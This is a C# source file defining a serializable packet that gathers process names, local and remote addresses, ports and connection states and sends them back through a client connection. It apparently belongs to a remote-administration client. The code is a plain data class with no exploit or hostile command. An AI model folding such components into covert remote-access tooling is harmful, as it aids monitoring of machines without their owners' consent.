using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetConnectionsResponse : IPacket
    {
        public string[] Processes { get; set; }

        public string[] LocalAddresses { get; set; }

        public string[] LocalPorts { get; set; }

        public string[] RemoteAdresses { get; set; }

        public string[] RemotePorts { get; set; }

        public byte[] States { get; set; }

        public GetConnectionsResponse()
        {
        }

        public GetConnectionsResponse(string[] processes, string[] localaddresses, string[] localports,
            string[] remoteadresses, string[] remoteports, byte[] states)
        {
            this.Processes = processes;
            this.LocalAddresses = localaddresses;
            this.LocalPorts = localports;
            this.RemoteAdresses = remoteadresses;
            this.RemotePorts = remoteports;
            this.States = states;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }

    }

}
